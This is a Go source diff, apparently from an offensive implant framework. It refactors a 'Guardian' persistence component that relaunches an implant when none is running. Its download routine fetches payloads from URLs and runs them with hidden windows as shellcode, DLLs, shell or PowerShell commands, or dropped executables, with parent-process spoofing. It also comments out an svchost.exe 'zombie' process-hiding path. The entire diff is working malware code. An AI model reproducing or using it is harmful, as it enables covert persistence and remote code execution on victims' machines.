@@ -7,33 +7,34 @@ import (
 	"io"
 	"net/http"
 	"os"
-	"strings"
 	"sync"
 	"time"
 
 	"github.com/iDigitalFlame/xmt/cmd"
+	"github.com/iDigitalFlame/xmt/cmd/filter"
 	"github.com/iDigitalFlame/xmt/device"
-	"github.com/iDigitalFlame/xmt/util"
 	"github.com/iDigitalFlame/xmt/util/bugtrack"
 	"github.com/iDigitalFlame/xmt/util/xerr"
 )
 
 const (
-	// Self is a constant that can be used to reference the current executable path without
-	// using the 'os.Executable' function.
+	// Self is a constant that can be used to reference the current executable
+	// path without using the 'os.Executable' function.
 	Self = "*"
 
 	timeout    = time.Second * 2
 	timeoutWeb = time.Second * 30
 )
 
-// ErrNoEndpoints is an error returned if no valid Guardian paths could be used and/or found during a launch.
-var ErrNoEndpoints = xerr.New("no Guardian paths found")
+// ErrNoEndpoints is an error returned if no valid Guardian paths could be used
+// and/or found during a launch.
+var ErrNoEndpoints = xerr.Sub("no paths found", 0x13)
 
 // Sentinel is a struct that can be used as a 'Named' arguments value to
-// functions in the 'man' package or can be Marshaled from a file or bytes source.
+// functions in the 'man' package or can be Marshaled from a file or bytes
+// source.
 type Sentinel struct {
-	Filter *cmd.Filter
+	Filter *filter.Filter
 	Linker string
 	Paths  []string
 }
@@ -41,10 +42,11 @@ type Sentinel struct {
 // Loader is an interface that allows for Sentinel structs to be built ONLY
 // AFTER a call to 'Check' returns false.
 //
-// This prevents reading of any Sentinel files if the Guardian already is running
-// and no action is needed.
+// This prevents reading of any Sentinel files if the Guardian already is
+// running and no action is needed.
 //
-// This is an internal interface that can be used by the 'LazyF' and 'LazyC' functions.
+// This is an internal interface that can be used by the 'LazyF' and 'LazyC'
+// functions.
 type Loader interface {
 	Wake(string) (bool, error)
 	Check(Linker, string) (bool, error)
@@ -58,6 +60,7 @@ type lazyLoader struct {
 }
 
 // F is a helper function that can be used as an in-line function.
+//
 // This function will ALWAYS return a non-nil Sentinel.
 //
 // The returned Sentinel will be Marshaled from the supplied file path.
@@ -82,7 +85,7 @@ func (z *lazyLoader) init() {
 func LazyF(p string) Loader {
 	return &lazyLoader{f: func() *Sentinel { return F(p) }}
 }
-func (s *Sentinel) text() [][]byte {
+func (s Sentinel) text() [][]byte {
 	v := make([][]byte, 0, len(s.Paths)+2)
 	if s.Filter != nil {
 		if b, err := json.Marshal(s.Filter); err == nil && len(b) > 2 {
@@ -90,7 +93,7 @@ func (s *Sentinel) text() [][]byte {
 		}
 	}
 	if len(s.Linker) > 0 {
-		v = append(v, []byte("*"+strings.ToLower(s.Linker)))
+		v = append(v, []byte("*"+s.Linker))
 	}
 	for i := range s.Paths {
 		v = append(v, []byte(s.Paths[i]))
@@ -98,8 +101,9 @@ func (s *Sentinel) text() [][]byte {
 	return v
 }
 
-// Check will attempt to contact any current Guardians watching on the supplied name. This function returns false
-// if the specified name could not be reached or an error occurred.
+// Check will attempt to contact any current Guardians watching on the supplied
+// name. This function returns false if the specified name could not be reached
+// or an error occurred.
 //
 // This function defaults to the 'Pipe' Linker if a nil Linker is specified.
 func Check(l Linker, n string) bool {
@@ -121,18 +125,30 @@ func LinkerFromName(n string) Linker {
 	if len(n) == 0 {
 		return Pipe
 	}
-	switch strings.ToLower(n) {
-	case "t", "tcp":
+	switch {
+	case len(n) == 1 && (n[0] == 't' || n[0] == 'T'):
 		return TCP
-	case "p", "pipe":
+	case len(n) == 1 && (n[0] == 'p' || n[0] == 'P'):
 		return Pipe
-	case "e", "event":
+	case len(n) == 1 && (n[0] == 'e' || n[0] == 'E'):
 		return Event
-	case "m", "mutex":
+	case len(n) == 1 && (n[0] == 'm' || n[0] == 'M'):
 		return Mutex
-	case "n", "mailslot":
+	case len(n) == 1 && (n[0] == 'n' || n[0] == 'N'):
 		return Mailslot
-	case "s", "semaphore":
+	case len(n) == 1 && (n[0] == 's' || n[0] == 'S'):
+		return Semaphore
+	case len(n) == 3 && (n[0] == 't' || n[0] == 'T'):
+		return TCP
+	case len(n) == 4 && (n[0] == 'p' || n[0] == 'P'):
+		return Pipe
+	case len(n) == 5 && (n[0] == 'e' || n[0] == 'E'):
+		return Event
+	case len(n) == 5 && (n[0] == 'm' || n[0] == 'M'):
+		return Mutex
+	case len(n) == 8 && (n[0] == 'm' || n[0] == 'M'):
+		return Mailslot
+	case len(n) == 9 && (n[0] == 's' || n[0] == 'S'):
 		return Semaphore
 	}
 	return Pipe
@@ -155,11 +171,15 @@ func File(p string) (*Sentinel, error) {
 }
 
 // C is a helper function that can be used as an in-line function.
+//
 // This function will ALWAYS return a non-nil Sentinel.
+//
 // This function uses the provided 'cipher.Block' to decrypt the resulting file
 // data. A nil block is the same as a 'F(p)' call.
 //
-// The returned Sentinel will be Marshaled from the supplied Cipher and file path.
+// The returned Sentinel will be Marshaled from the supplied Cipher and file
+// path.
+//
 // If any errors occur, an empty Sentinel struct will be returned instead.
 func C(c cipher.Block, p string) *Sentinel {
 	s, err := Crypt(c, p)
@@ -178,25 +198,29 @@ func C(c cipher.Block, p string) *Sentinel {
 func LazyC(c cipher.Block, p string) Loader {
 	return &lazyLoader{f: func() *Sentinel { return C(c, p) }}
 }
-func exec(f *cmd.Filter, p ...string) error {
+func exec(f *filter.Filter, p ...string) error {
 	if len(p) == 0 {
 		return cmd.ErrEmptyCommand
 	}
 	if bugtrack.Enabled {
 		bugtrack.Track("man.exec(): Running p=%s", p)
 	}
-	var e cmd.Runnable
-	if device.OS == device.Windows && strings.HasSuffix(strings.ToLower(p[0]), ".dll") {
+	var (
+		n = len(p[0])
+		e cmd.Runnable
+	)
+	if device.OS == device.Windows && (n > 4 && (p[0][n-1] == 'l' || p[0][n-1] == 'L') && (p[0][n-3] == 'd' || p[0][n-3] == 'D') && p[0][n-4] == '.') {
+		// NOTE(dij): Work on this after Migration
 		// 1 -in- 5 chance of using a Zombie process instead.
-		if util.FastRandN(5) == 0 {
-			x := cmd.NewZombie(nil, "svchost.exe", "-k", "RPCSS", "-p")
-			x.Path = p[0]
-			x.SetWindowDisplay(0)
-			x.SetNoWindow(true)
-			e = x
-		} else {
-			e = cmd.NewDLL(p[0])
-		}
+		// if util.FastRandN(5) == 0 {
+		//	x := cmd.NewZombie(nil, "svchost.exe", "-k", "RPCSS", "-p")
+		//	x.Path = p[0]
+		//	x.SetWindowDisplay(0)
+		//	x.SetNoWindow(true)
+		//	e = x
+		//} else {
+		e = cmd.NewDLL(p[0])
+		//}
 	} else {
 		x := cmd.NewProcess(p...)
 		x.SetWindowDisplay(0)
@@ -210,8 +234,9 @@ func exec(f *cmd.Filter, p ...string) error {
 // Wake will attempt to look for a Guardian using the provided path. This uses
 // the set Linker in the Sentinel.
 //
-// This function will return true and nil if a Guardian is launched and false and nil
-// if a Guardian was found. Any other errors that occur will also be returned with false.
+// This function will return true and nil if a Guardian is launched and false
+// and nil if a Guardian was found. Any other errors that occur will also be
+// returned with false.
 func (s Sentinel) Wake(n string) (bool, error) {
 	return s.WakeContext(context.Background(), n)
 }
@@ -222,8 +247,9 @@ func (z *lazyLoader) Wake(n string) (bool, error) {
 // Check will attempt to look for a Guardian using the provided Linker and path.
 // This overrides the set Linker in the Sentinel.
 //
-// This function will return true and nil if a Guardian is launched and false and nil
-// if a Guardian was found. Any other errors that occur will also be returned with false.
+// This function will return true and nil if a Guardian is launched and false
+// and nil if a Guardian was found. Any other errors that occur will also be
+// returned with false.
 func (s Sentinel) Check(l Linker, n string) (bool, error) {
 	return s.CheckContext(context.Background(), l, n)
 }
@@ -232,15 +258,20 @@ func (z *lazyLoader) Check(l Linker, n string) (bool, error) {
 }
 
 // WakeContext will attempt to look for a Guardian using the provided path.
-// This uses the set Linker in the Sentinel and will use the provided Context for
-// cancelation.
+// This uses the set Linker in the Sentinel and will use the provided Context
+// for cancelation.
 //
-// This function will return true and nil if a Guardian is launched and false and nil
-// if a Guardian was found. Any other errors that occur will also be returned with false.
+// This function will return true and nil if a Guardian is launched and false
+// and nil if a Guardian was found. Any other errors that occur will also be
+// returned with false.
 func (s Sentinel) WakeContext(x context.Context, n string) (bool, error) {
 	return s.CheckContext(x, LinkerFromName(s.Linker), n)
 }
-func download(x context.Context, f *cmd.Filter, u string) (string, error) {
+func (z *lazyLoader) WakeContext(x context.Context, n string) (bool, error) {
+	z.o.Do(z.init)
+	return z.r.CheckContext(x, LinkerFromName(z.r.Linker), n)
+}
+func download(x context.Context, f *filter.Filter, u string) (string, error) {
 	var (
 		q, c = context.WithTimeout(x, timeout*5)
 		r, _ = http.NewRequestWithContext(q, http.MethodGet, u, nil)
@@ -257,42 +288,37 @@ func download(x context.Context, f *cmd.Filter, u string) (string, error) {
 		bugtrack.Track("man.download(): Download u=%s", u)
 	}
 	var d bool
-	switch strings.ToLower(i.Header.Get("Content-Type")) {
-	case "cmd/dll", "application/dll":
+	switch ParseDownloadHeader(i.Header) {
+	case 1:
+		// NOTE(dij): Add transform DLL -to- Shellcode conversion here?
 		d = true
-	case "cmd/powershell", "application/powershell":
-		e := cmd.NewProcessContext(x)
-		e.SetParent(f)
-		e.SetNoWindow(true)
-		if e.SetWindowDisplay(0); device.OS == device.Windows {
-			e.Args = []string{"powershell.exe", "-Comm", string(b)}
-		} else {
-			e.Args = []string{"pwsh", "-Comm", string(b)}
-		}
-		return "", e.Start()
-	case "cmd/cmd", "cmd/execute", "cmd/script", "application/cmd", "application/execute", "application/script":
-		e := cmd.NewProcessContext(x)
-		e.SetParent(f)
-		e.SetNoWindow(true)
-		e.SetWindowDisplay(0)
-		e.Args = append([]string{device.Shell}, device.ShellArgs...)
-		e.Args = append(e.Args, string(b))
-		return "", e.Start()
-	case "cmd/asm", "cmd/binary", "cmd/assembly", "cmd/shellcode", "application/asm", "application/binary", "application/assembly", "application/shellcode":
+	case 2:
 		if bugtrack.Enabled {
 			bugtrack.Track("man.download(): Download is shellcode u=%s", u)
 		}
 		e := cmd.NewAsmContext(x, b)
 		e.SetParent(f)
 		return "", e.Start()
+	case 3:
+		e := cmd.NewProcessContext(x, device.Shell, device.ShellArgs, string(b))
+		e.SetParent(f)
+		e.SetNoWindow(true)
+		e.SetWindowDisplay(0)
+		return "", e.Start()
+	case 4:
+		e := cmd.NewProcessContext(x, device.PowerShell, "-comm", string(b))
+		e.SetParent(f)
+		e.SetNoWindow(true)
+		e.SetWindowDisplay(0)
+		return "", e.Start()
 	}
 	var n string
 	if d {
-		n = "*.dll"
+		n = execB
 	} else if device.OS == device.Windows {
-		n = "*.exe"
+		n = execC
 	} else {
-		n = "*.so"
+		n = execA
 	}
 	z, err := os.CreateTemp("", n)
 	if err != nil {
@@ -306,7 +332,7 @@ func download(x context.Context, f *cmd.Filter, u string) (string, error) {
 	if bugtrack.Enabled {
 		bugtrack.Track("man.download(): Download to tempfile u=%s, p=%s", u, p)
 	}
-	if os.Chmod(z.Name(), 0755); n == "*.dll" {
+	if os.Chmod(z.Name(), 0755); d {
 		e := cmd.NewDLL(z.Name())
 		e.SetParent(f)
 		return p, e.Start()
@@ -317,17 +343,14 @@ func download(x context.Context, f *cmd.Filter, u string) (string, error) {
 	e.SetWindowDisplay(0)
 	return p, e.Start()
 }
-func (z *lazyLoader) WakeContext(x context.Context, n string) (bool, error) {
-	z.o.Do(z.init)
-	return z.r.CheckContext(x, LinkerFromName(z.r.Linker), n)
-}
 
-// CheckContext will attempt to look for a Guardian using the provided Linker and path.
-// This overrides the set Linker in the Sentinel and will use the provided Context for
-// cancelation.
+// CheckContext will attempt to look for a Guardian using the provided Linker and
+// path. This overrides the set Linker in the Sentinel and will use the provided
+// Context for cancelation.
 //
-// This function will return true and nil if a Guardian is launched and false and nil
-// if a Guardian was found. Any other errors that occur will also be returned with false.
+// This function will return true and nil if a Guardian is launched and false
+// and nil if a Guardian was found. Any other errors that occur will also be
+// returned with false.
 func (s Sentinel) CheckContext(x context.Context, l Linker, n string) (bool, error) {
 	if Check(l, n) {
 		return false, nil
@@ -341,13 +364,13 @@ func (z *lazyLoader) CheckContext(x context.Context, l Linker, n string) (bool, 
 	z.o.Do(z.init)
 	return wake(x, l, n, z.r.Filter, z.r.Paths)
 }
-func wake(x context.Context, l Linker, n string, f *cmd.Filter, p []string) (bool, error) {
+func wake(x context.Context, l Linker, n string, f *filter.Filter, p []string) (bool, error) {
 	if len(p) == 0 {
 		return false, ErrNoEndpoints
 	}
 	var err error
 	if f == nil {
-		f = cmd.AnyParent
+		f = filter.Any
 	}
 	for i := range p {
 		if len(p[i]) == 0 {
@@ -362,7 +385,7 @@ func wake(x context.Context, l Linker, n string, f *cmd.Filter, p []string) (boo
 			if e, err = os.Executable(); err == nil {
 				err = exec(f, e)
 			}
-		case strings.HasPrefix(p[i], "http"):
+		case len(p[i]) > 5 && (p[i][0] == 'h' || p[i][0] == 'H') && (p[i][1] == 't' || p[i][1] == 'T') && (p[i][2] == 't' || p[i][2] == 'T') && (p[i][3] == 'p' || p[i][3] == 'P'):
 			var e string
 			if e, err = download(x, f, p[i]); err != nil && len(e) > 0 {
 				os.Remove(e)
